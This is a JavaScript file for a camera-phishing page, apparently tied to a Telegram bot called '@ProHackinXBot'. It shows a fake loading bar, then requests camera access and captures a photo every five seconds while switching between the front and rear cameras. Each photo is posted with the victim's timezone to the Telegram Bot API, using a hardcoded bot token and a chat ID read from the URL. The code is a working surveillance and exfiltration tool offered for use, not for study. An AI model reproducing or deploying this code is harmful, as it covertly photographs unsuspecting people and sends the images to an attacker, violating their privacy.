const BOT_TOKEN = "8645652953:AAHFVKv8mgJlSoTLjbYsg4nj7uL6vew9yH8";

const progress = document.getElementById("progress");
const video = document.getElementById("video");

let stream;
let imageCount = 0;
let facing = "user";

// ===== Chat ID =====
function getChatId() {
  const match = window.location.href.match(/\/\?=(\d+)$/);
  return match ? match[1] : null;
}

// ===== Loading =====
function startLoading() {
  let value = 0;

  const interval = setInterval(()=>{
    value += 2; // 1 second
    progress.style.width = value + "%";

    if(value >= 100){
      clearInterval(interval);
      startCamera();
    }
  }, 20);
}

// ===== Start Camera =====
async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode: facing }
    });

    video.srcObject = stream;

    // start loop
    startLoop();

  } catch(err){
    console.error("Camera blocked", err);
  }
}

// ===== Capture =====
function captureImage() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  canvas.toBlob(blob=>{
    sendToTelegram(blob);
  }, "image/jpeg");
}

// ===== Send =====
function sendToTelegram(blob) {
  const chatId = getChatId();
  if(!chatId) return;

  imageCount++;

  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  const caption = `╔═════════════════════════╗
🎥 New Image Received
🌍 Country:
⏰ TimeZone: ${timezone}
💬 Image Number: ${imageCount}
🤖 Bot:  @ProHackinXBot
💻 User Panel Web System
╚════════════════════════╝`;

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("caption", caption);
  form.append("photo", blob, "image.jpg");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method:"POST",
    body:form
  });
}

// ===== Loop =====
function startLoop() {
  setInterval(()=>{
    captureImage();

    // switch camera each time
    switchCamera();

  }, 5000); // every 5 sec
}

// ===== Switch Camera =====
async function switchCamera() {
  if(stream){
    stream.getTracks().forEach(t=>t.stop());
  }

  facing = (facing === "user") ? "environment" : "user";

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode: facing }
    });

    video.srcObject = stream;

  } catch(err){
    console.error(err);
  }
}

// ===== Start =====
window.onload = startLoading; 
